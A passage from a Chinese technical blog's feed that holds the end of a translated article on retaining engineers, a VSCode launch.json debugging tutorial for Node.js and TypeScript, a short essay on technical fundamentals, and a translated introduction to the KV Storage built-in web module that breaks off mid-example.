公司就有这些福利，毕竟我们不是一家小公司了~</p><p>一般来说，在你的团队中创建一个良好的学习文化是非常重要的，当你扩大团队，特别是雇用较多的初级开发者的时候，尤为重要。一个好的学习文化是，推动工程师参与到他们所属的技术圈中去，这可以通过建立小组组织开源、回馈社区来实现。促成优秀的人形成技术小组，他们可以跟踪团队的技术债务，并与产品团队合作，确保系统良好运转。</p><p>许多大公司随着业务的发展需要与遗留的系统做斗争，一件绝对糟糕的事情是，关闭遗留系统，让团队随着时间恶化，最后只能在旧系统上工作。没有人想加入一个专门维护遗留系统的团队。对于大公司而言，派发新的工作以及在旧系统上做调整，可能并不是特别那么方便，但是对留住新的工程师来说，这些事情至关重要。</p><p>像 Google 规模的资源丰富的公司，允许让工程师来重写系统；对大多数的大公司而言，应该允许让工程师团队在遗留的系统之上继续演进，或者构建一些防止蜕化的中间层等。最重要的是，需要确保这些团队可以使用新的模式、设计和架构来添加新的功能，这样才能保证工程师可以继续发展并保持参与的热情。</p><p>优秀的工程师期望在具有技术驱动的文化的公司里工作，这也意味着公司能够让团队采用敏捷和现代的方式进行开发，让拥有业务人员、工程师、产品经理和用研的完整技能的团队根据他们认为合适的方式决策。随着业务环境和客户的变化，产品的发言权也需要变化，没有人期望在条条框框中艰难前行，因为这意味着学习和成长都会变得缓慢。我们可以去看看世界上那些成功的科技公司，即便规模已经十分庞大，但是它们依然可以快速发展。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>对大小公司而言，技术驱动的文化对工程师来说都是一种吸引力，公司可以信任团队最大程度实现战略，并完成制定的 KPI。以这种方式赋予人们权力，意味着他们将会拥有更大责任感；通过这种方式，他们将获得锻炼和成长；更重要的是，他们会为自己的所做的事情而感到自豪，因为这些建设性工作的产出是他们能够长期拥有的东西。</p><p>以上，是我认为能够在工程师招聘领域中，发挥作用并长期保留优秀人才的几种方式。通过这些经过验证的方法，我们在引进优秀人才及长期保留方面取得了令人难以置信的成功。在我看来，其中大部分与金钱和津贴没什么关系。</p><hr><p>译者：不知道是我理解的问题，还是作者表述的问题，好几个句子缺乏前后的逻辑连贯性，翻译起来真头疼。算是一篇失败的翻译吧…</p>]]></content>
      
      
      <categories>
          
          <category> 翻译 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 译文 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>VSCode 调试中 launch.json 配置不完全指南</title>
      <link href="/blog/2019/03/18/debugging-in-vscode-tutorial/"/>
      <url>/blog/2019/03/18/debugging-in-vscode-tutorial/</url>
      
        <content type="html"><![CDATA[<p>经常使用 VSCode 的同学多多少少会看到项目中有这么一个文件夹 <code>.vscode</code>，这是一个在 VSCode 软件上才能发挥作用的配置文件夹，它一般是跟随项目的，其用途与我们平时看到的 <code>jsconfig.json</code>, <code>.editor.config</code> 等相似，都是为了对工程做更多的约束，或者对代码做更多的规范化处理。</p><p>VSCode 内置了对 Node.js 的调试支持，如果你需要调试其他语言如 C++、PHP、Python 等，可以在 VSCode 的插件市场安装对应的插件。由于调试的技巧和配置在语言之间的差异不大，文本将以 Node.js 的调试为例进行讲解。</p><p>调试的官方基础文档在 <a href="https://code.visualstudio.com/Docs/editor/debugging">这里</a>，看图可以了解大致的操作步骤，如果你不了解 Node.js 的调试原理，可以先读一读我之前写的 <a href="https://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line/">这篇文章</a>，有三四年了，不过内容还没过时。下面将给大家讲解调试时可能遇到的几种场景，以及对应的配置文件参数说明。</p><h3 id="一起动手"><a href="#一起动手" class="headerlink" title="一起动手"></a>一起动手</h3><p>如果你此刻正在电脑前，不妨先把 <a href="https://github.com/barretlee/debugging-in-vscode-tutorial">代码</a> 克隆到本地，跟着一起动手操作，</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">https://github.com/barretlee/debugging-in-vscode-tutorial</span></span><br><span class="line">git clone git@github.com:barretlee/debugging-in-vscode-tutorial.git;</span><br><span class="line">cd debugging-in-vscode-tutorial</span><br><span class="line">npm install;</span><br></pre></td></tr></table></figure><p>然后使用 VSCode 打开代码。</p><h3 id="场景一，调试-Node-js-程序"><a href="#场景一，调试-Node-js-程序" class="headerlink" title="场景一，调试 Node.js 程序"></a>场景一，调试 Node.js 程序</h3><p>这里的 Node.js 指的是使用原生 JS 编写的简单程序，看 Demo：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// File: src/index.js</span></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>).<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">url</span> === <span class="string">&#x27;/&#x27;</span>) &#123;</span><br><span class="line">    fs.<span class="title function_">createReadStream</span>(</span><br><span class="line">      path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;../index.html&#x27;</span>)</span><br><span class="line">    ).<span class="title function_">pipe</span>(res);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    res.<span class="title function_">end</span>(req.<span class="property">url</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8001</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;run at 8001&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>在程序第 3 行位置打一个断点：</p><p><img src="/../blogimgs/2019/03/18/vscode-debug-nodejs.png" alt="upload successful"></p><p>下面就一起来看看，这样一个程序的调试配置是怎样的，可以打开 <code>.vscode/launch.json</code>，查看 name 为 <code>调试 Node.js 程序</code> 的一项，配置为：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试 Node.js 程序&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/src/index.js&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>很简单的三个参数，稍微解释下：</p><ul><li><code>type</code>，必填项，调试类型，当前为 node，如果是 PHP 调试，则在安装 PHP 调试插件后写 php；</li><li><code>request</code>，必填项，有两种类型，分别是 <code>launch</code> 和 <code>attach</code>，前者的意思就是 VSCode 会打开这个程序然后进入调试，后者的意思是你已经打开了程序，然后接通 Node.js 的内部调试协议进行调试，如果你看过上面的“Node.js 的调试原理”一文，应该可以大致理解；</li><li><code>program</code>，程序的启动入口；</li></ul><p>配置好了以后，点击调试按钮，或者按下 <code>F5</code>，VSCode 就会执行这段程序起一个服务器并开始监听 8001 端口。如果此时你通过浏览器访问 <code>http://127.0.0.1:8001</code> 或者命令行执行 <code>curl http://127.0.0.1:8001</code>，便会看到程序进入刚才的断点之中：</p><p><img src="/../blogimgs/2019/03/18/vscode-debug-nodejs-breakpoint.png" alt="upload successful"></p><p>相信这个调试界面你并不陌生。当然，还可以使用另外的配置方式，打开 <code>launch.json</code> 找到 name 为 <code>调试 Node.js 程序 - args</code> 的文件：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试 Node.js 程序 - args&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;runtimeExecutable&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;$&#123;workspaceFolder&#125;/src/index.js&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里并没有采用 <code>program</code> 来描述程序入口，而是通过 <code>runtimeExecutable</code> 和 <code>args</code> 组合的方式来启动程序，</p><ul><li><code>runtimeExecutable</code>，使用什么命令启动</li><li><code>args</code>，启动时的参数</li></ul><p>如果有一个叫做 <code>node2</code> 的命令也可以执行 JS，那么如果我们期望通过 <code>node2</code> 来启动，便可以用这两个参数来指定调试。</p><h3 id="场景二：调试一个-TS-Node-程序"><a href="#场景二：调试一个-TS-Node-程序" class="headerlink" title="场景二：调试一个 TS Node 程序"></a>场景二：调试一个 TS Node 程序</h3><p>与场景一稍微不同的是，我们当前的程序是一个 TypeScript 文件（<code>.ts</code> 后缀），注意我们的项目 <code>package.json</code> 中添加了 <code>typescript</code> 和 <code>ts-node</code> 两个依赖，前者可以用来编译 ts 文件，后者可以执行 ts 文件。打开 <code>launch.json</code> 找到 name 为 <code>调试 TS Node 程序 - args</code> 的配置：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试 TS Node 程序 - args&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;runtimeExecutable&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;runtimeArgs&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;-r&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="string">&quot;ts-node/register&quot;</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;$&#123;workspaceFolder&#125;/src/index.ts&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>在这里你看到了一个新参数 <code>runtimeArgs</code>，需要注意的是 <code>runtimeArgs</code> 是为 <code>runtimeExecutable</code> 环境提供的配置，而 args 是为程序提供的配置。这个 JSON 的意思是：通过 node 来启动 <code>/src/index.ts</code>，在启动时为 node 注入一个 <code>ts-node/register</code> 模块，以便可以执行 ts 类型的文件。实际执行代码为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">node --inspect-brk=<span class="variable constant_">DEBUG_PORT</span> -r ts-node/register ./src/index.<span class="property">ts</span></span><br></pre></td></tr></table></figure><p>需要注意的是，虽然 ts-node 可以直接执行 <code>.ts</code> 文件，但由于 <code>launch.json</code> 中启动调试的时候，会默认加上一个 <code>--inspect-brk=DEBUG_PORT</code> 参数，而 ts-node 不支持这个参数，<strong>所以无法使用下面的方式进行调试</strong>：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;[错误]调试 TS Node 程序 - ts-node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;runtimeExecutable&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/node_modules/.bin/ts-node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="string">&quot;$&#123;workspaceFolder&#125;/src/index.ts&quot;</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>当然我们还有其他的方式来启动调试：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试 TS Node 程序 - preTask&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/out/index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;preLaunchTask&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tsc_build&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这里多了一个新的配置参数 <code>preLaunchTask</code>，顾名思义，在 launch 调试之前先执行一个任务，这里就涉及到 <code>.vscode/tasks.json</code> 文件的配置了，我们在 <code>tasks.json</code> 中配置一个 label 为 <code>tsc_build</code> 的任务：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tsc_build&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;typescript&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;tsconfig&quot;</span><span class="punctuation">:</span> <span class="string">&quot;tsconfig.json&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>在启动调试之前，会启动一个 <code>typescript</code> 的编译操作，将文件编译到 <code>out</code> 目录下（具体可查看 <code>tsconfig.json</code> 的编译配置），然后通过 node 来启动编译后的文件，由于编译允许生成 sourcemap 文件，所以调试的断点依然会在源码上：</p><p><img src="/../blogimgs/2019/03/18/debug-in-vscode-preluanchtask.png" alt="upload successful"></p><h3 id="场景三：调试已启动的-Node-js-程序"><a href="#场景三：调试已启动的-Node-js-程序" class="headerlink" title="场景三：调试已启动的 Node.js 程序"></a>场景三：调试已启动的 Node.js 程序</h3><p>这里就要提到 <code>request</code> 的另外一个值 <code>attach</code> 了，如果你理解了 <a href="https://www.barretlee.com/blog/2015/10/07/debug-nodejs-in-command-line/#menuIndex1">背后的原理</a>，你会觉得这个单词用的十分贴切。我们先用 node 来启动 <code>src</code> 下的 <code>index.js</code>：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">node ./src/index.js</span><br></pre></td></tr></table></figure><p>此时如果我们想给这个程序断点调试，可以在 <code>launch.json</code> 中作如下配置：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Attach to node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;node&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;attach&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;processId&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;command:PickProcess&#125;&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>推荐使用 <code>$&#123;command:PickProcess&#125;</code> 作为 <code>processId</code> 的值，因为 VSCode 会遍历所有的 Node PID 列出来让你选择，如下图所示：</p><p><img src="/../blogimgs/2019/03/18/vscode-debug-node-attach-choose.png" alt="upload successful"></p><p>图中第一个就是我们启动的程序，processId 为 <code>59172</code>，当然你也可以直接将配置中的值写死为 <code>59172</code>（并不推荐），这样就少了选择的过程了。</p><h3 id="场景四：调试网页的-JS-代码"><a href="#场景四：调试网页的-JS-代码" class="headerlink" title="场景四：调试网页的 JS 代码"></a>场景四：调试网页的 JS 代码</h3><p>大家应该十分熟悉在 Chrome 中调试 JS 代码，不过 VSCode 允许你在安装了 <code>Debugger for Chrome</code> 插件后，直接在 VSCode 调试 JS 代码，让你的代码和调试融为一体，提升开发体验：</p><p><img src="/../blogimgs/2019/03/18/debugger-for-chrome.png" alt="upload successful"></p><p>可以通过如下简单的配置进行调试：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试网页的 JS 文件&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;chrome&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;file&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;/index.html&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>注意，这里的 type 是 <code>chrome</code>，默认会启动一个 Chrome 浏览器（新用户）加载 <code>file</code> 字段对应的文件地址（通过 <code>file://</code> 协议加载），文件中用到的 JS 都可以断点调试。当然你也可以起一个 Web Server 来调试 <code>http://</code> 协议的文件，这里就需要设置 <code>webRoot</code> 和 <code>url</code> 参数了，可自行 Google。</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>这四个场景已经可以覆盖大部分的 JavaScript 调试了，其实还有几个比较实用的参数，如将 <code>console</code> 设置为 <code>integratedTerminal</code>，那么调试过程的信息会在 Terminal Panel 而不是 Debugger Panel 展示。具体可以阅读 VSCode 的 <a href="https://code.visualstudio.com/Docs/editor/debugging#_launchjson-attributes">官方文档</a>。</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VSCode </tag>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>技术人的坚守</title>
      <link href="/blog/2019/03/18/tech-and-business-in-long-term-version/"/>
      <url>/blog/2019/03/18/tech-and-business-in-long-term-version/</url>
      
        <content type="html"><![CDATA[<p>做业务久了以后，对技术人员而言，会出现什么样的问题，下面我来稍微聊一聊。</p><h3 id="普遍的现状"><a href="#普遍的现状" class="headerlink" title="普遍的现状"></a>普遍的现状</h3><p>很多公司的技术体系是十分完备的，尤其是基建设施。一个人进去之后，他不需要在底层做太多的工作，更多的是根据业务的诉求，在熟悉工具、环境和开发流程后，把需求方的想法落地。</p><p>一个团队，有做工程的、有做架构的、也有做工具平台的，这些东西一般都是根据业务的属性，确定了大的基础，在短期内不会有天翻地覆的变化。可能会随着业务的演变或者因为技术的创新，衍生出一些周边产品。</p><p>基建设施的模块化程度做得越高，工具体验做得越好，平台做得越完备，那么事实上，对上层做业务的同学来说，底层技术细节也就屏蔽的越多。对业务来说，这本身是一件好事。</p><p>可是，有的技术领域变化是非常快的，两三年会经历好几轮的技术迭代，基建设施抹平的那一层，可能已经不是你当初学的那样了，在深度和广度上，都有了质的飞跃。</p><p>有些团队其实会鼓励做业务的同学，去基建设施里面贡献代码，甚至期望你参与到部分基础建设中，让业务给基建更多的反馈和输入。</p><p>但不是所有同学都有时间和精力，兼顾业务和底层技术的，做业务的同学对业务的理解会越来越深，团队协作能力也会越来越强，但是那些，底层上的，能够支撑你在技术领域走得更游刃有余的东西，就没有学的很扎实。</p><h3 id="技术人的坚守"><a href="#技术人的坚守" class="headerlink" title="技术人的坚守"></a>技术人的坚守</h3><p>可以反思一下，你的技术是不是只能在那些基础设施完善的团队才能发挥出来，脱离了这些基础，你的生产力就几乎归零了。</p><p>我一直倡导搞技术的同学，还是要把基础学牢固。什么是基础？就是计算机原理、算法、设计模式、数据结构，包括数学等等偏理论和设计的东西。这些东西是可以一直带在身上的。</p><p>另外，自学是一门手艺。我相信未来很多公司都会倾向于去招聘基础扎实，并且学习能力超群的同学。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
          <category> 观点和感想 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 成长 </tag>
            
            <tag> 业务 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>KV Storage，Web 上第一个内置模块</title>
      <link href="/blog/2019/03/13/first-buildin-module-kv-storage/"/>
      <url>/blog/2019/03/13/first-buildin-module-kv-storage/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文地址：<a href="https://developers.google.com/web/updates/2019/03/kv-storage">KV Storage, the Web’s First Built-in Module</a><br>原文时间：2019年3月<br>翻译计划：<a href="https://github.com/barretlee/translation-plan">https://github.com/barretlee/translation-plan</a><br>翻译人员：<a href="https://www.barretlee.com/about/">小胡子哥</a></p></blockquote><p>在过去十年中，浏览器供应商和网络性能专家一直在说 <a href="https://hacks.mozilla.org/2012/03/there-is-no-simple-solution-for-local-storage/">localStorage 很慢</a>，网络开发者应该停止使用它。</p><p>说实在的，确实如此，localStorage 是一个阻止主线程的同步 API，当你使用它的时候它可能会影响页面之间的交互。</p><p>问题在于 localStorage API 的设计十分简单，唯一能够替代 localStorage 的异步方案只有 IndexedDB，而它却因为 API 易用性设计较差鲜为人知。</p><p>因此开发者需要在难用的 IndexedDB 和有性能问题的 localStorage 中作出抉择。虽然有些库提供了 localStorage API 的简洁性，同时又采用异步调用来解决性能问题，但是在网页应用中，一个库本身的文件大小所包含的网络下载开销和 JS 解析开销也会影响到性能。</p><p>是否可以有这么一个库，既提供异步调用的 Storage API，性能方面又比较良好，并且我们使用它的时候还不需要支付文件大小开销呢？</p><p>答案是 Yes！Chrome 正在实验一个 build-in 模块的新功能，我们计划发布了第一个名为 <code>KV Storage</code> 的 build-in 模块，它就具备异步的 key&#x2F;value Storage API。</p><p>在我介绍 KV Storage 之前，先给大家介绍下什么是 build-in 模块。</p><h3 id="什么是-build-in-模块？"><a href="#什么是-build-in-模块？" class="headerlink" title="什么是 build-in 模块？"></a>什么是 build-in 模块？</h3><p>build-in 模块和普通的 JavaScript 模块一样，只不过它无需下载，原生内置在浏览器中。</p><p>与传统的 Web API 一样，内置模块必须经过标准化和具有明确定义的规范化；但与传统 Web API 不同的是，它们不会暴露在全局范围内，可以通过 <code>import</code> 方式获取。这样会带来一些优势：</p><ul><li>在初始化一个新的 JavaScript 上下文的时候（如打开一个新 Tab、Worker 或 Service Worker）不会增加任何开销；</li><li>在模块被 import 之前不会占用任何内存和 CPU；</li><li>不存在与其他代码全局变量重名的风险；</li></ul><p>要导入 build-in 模块，需要使用前缀 <code>std:</code>，后面紧接着 build-in 模块的名字。在支持 build-in 模块的浏览器中，你可以通过如下方式导入一个 KV Storage 模块：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;storage, <span class="title class_">StorageArea</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;std:kv-storage&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="KV-Storage-模块"><a href="#KV-Storage-模块" class="headerlink" title="KV Storage 模块"></a>KV Storage 模块</h3><p>KV Storage 模块的 API 与 localStorage 是相似的，只不过它的 API 有点像 JavaScript 的 <code>Map</code>，提供的是 <code>get()</code>，<code>set()</code> 和 <code>delete()</code>，而非  <code>getItem()</code>，<code>setItem()</code> 和 <code>removeItem()</code>，另外它还有几个 localStorage 不具备方法，如 <code>keys()</code>，<code>values()</code> 和 <code>entries()</code>，与 Map 相似，它的 key 没有限定必须为 string 类型，可以是任何结构化可序列化类型。</p><p>但是与 <code>Map</code> 不同的是，KV Storage 返回的结果是 <code>promise</code> 或 <code>async iterators</code> 类型，详细的 API 介绍，可以戳 <a href="https://wicg.github.io/kv-storage/#storagearea">这里</a>。</p><p>你可能注意到了上面的代码，包含 <code>storage</code> 和 <code>StorageArea</code> 两个导出对象，<code>storage</code> 是一个 <code>StorageArea</code> 类的实例，名为 <code>default</code>，也会是开发者未来在代码中用的最频繁的一个导出对象。<code>StorageArea</code> 类是为需要额外隔离的场景提供的，比如三方库中的储存数据为了避免与 <code>default</code> 实例产生冲突的时候就需要重新创建一个实例。<code>StorageArea</code> 数据被储存在 IndexedDB 数据库中，取名为 <code>kv-storage:$&#123;name&#125;</code>，这里的 <code>name</code> 是 <code>StorageArea</code> 的实例名称。下面就是一个如何使用 KV Storage 的例子：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123;storage&#125; <span class="keyword">from</span> <span class="string">&#x27;std:kv-storage&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> <span class="title function_">main</span> = <span class="keyword">async</span> (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> oldPreferences = <span class="keyword">await</span> storage.<span class="title function_">get</span>(<span class="string">&#x27;preferences&#x27;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;form&#x27;</span>).<span class="title function_">addEventListener</span>(<span class="string">&#x27;submit&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> newPreferences = <span class="title class_">Object</span>.<span class="title function_">assign</span>(&#123;&#125;, oldPreferences, &#123;</span><br><span class="line">      <span class="comment">// Updated preferences go here...</span></span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">await</span> storage.<span class="title function_">set</span>(<span class="string">&#x27;preferences&#x27;</span>, newPreferences);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">main</span>();</span><br></pre></td></tr></table></figure><p><em>这里需要注意的是，KV Storage 目前只有 Chrome 74+ 版本才支持，你需要在实验室打开对应的开关：chrome:&#x2F;&#x2F;flags&#x2F;#enable-experimental-web-platform-features.</em></p><h3 id="浏览器不支持-KV-Storage-时如何处理？"><a href="#浏览器不支持-KV-Storage-时如何处理？" class="headerlink" title="浏览器不支持 KV Storage 时如何处理？"></a>浏览器不支持 KV Storage 时如何处理？</h3><p>如果你熟悉在浏览器中使用原生 JavaScript 模块，你可能知道（至少到目前为止）导入除 URL 以外的任何内容都会产生错误。而 <code>std：kv-storage</code> 就不是有效的 URL。</p><p>那么，这里我们抛出一个问题：我们是否需要等待所有的浏览器都支持 build-in 模块的时候才开始在代码中使用它呢？</p><p>答案当然是 NO！你现在就可以配合 <code>import maps</code> 在你的代码中使用 build-in 模块！</p><p><strong>import maps</strong></p><p><a href="https://github.com/WICG/import-maps">import maps</a> 本质上是一种机制，开发人员可以通过该机制将 <code>import</code> 的包别名为一个或多个备用标识。这非常有用，它提供了一种方法，可以让浏览器在运行时更改代码中 <code>import</code> 的内容。</p><p>这就为 build-in 模块提供了一种 polyfill 的机制，具体如下所示：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 定义好 import map --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;importmap&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="string">&quot;imports&quot;</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&quot;/path/to/kv-storage-polyfill.mjs&quot;</span>: [</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;std:kv-storage&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">      <span class="string">&quot;/path/to/kv-storage-polyfill.mjs&quot;</span></span></span><br><span class="line"><span class="language-javascript">    ]</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 在 import 执行时会读取 map 配置--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;module&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">import</span> &#123;storage&#125; <span class="keyword">from</span> <span class="string">&#x27;/path/to/kv-storage-polyfill.mjs&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="comment">// 使用 `storage` ...</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span 